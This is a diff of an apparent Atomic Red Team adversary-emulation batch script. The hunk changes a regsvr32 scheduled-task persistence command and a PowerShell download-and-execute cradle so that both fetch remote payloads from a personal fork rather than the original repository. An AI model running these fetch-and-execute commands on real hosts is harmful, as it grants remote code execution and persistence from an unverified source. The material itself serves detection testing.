@@ -10,13 +10,13 @@
 :: RegSvr32 https://attack.mitre.org/wiki/Technique/T1117
 :: This particular technique will reach out to the github repository (network) and spawn calc (process) every 30 minutes.
 
-SCHTASKS /Create /SC MINUTE /TN "Atomic Testing" /TR "regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/RegSvr32.sct scrobj.dll" /mo 30
+SCHTASKS /Create /SC MINUTE /TN "Atomic Testing" /TR "regsvr32.exe /s /u /i:https://raw.githubusercontent.com/theclintox/atomic-red-team/master/Windows/Payloads/RegSvr32.sct scrobj.dll" /mo 30
 
 :: Tactic: Discovery
 :: Execution: https://attack.mitre.org/wiki/Technique/T1086
 :: Have PowerShell download the Discovery.bat, output to a local file (for review later)
 
-powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat')" > output.txt
+powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/theclintox/atomic-red-team/master/ARTifacts/Misc/Discovery.bat')" > output.txt
 
 :: Tactic: Credential Access
 :: Technique: Create Account https://attack.mitre.org/wiki/Technique/T1136
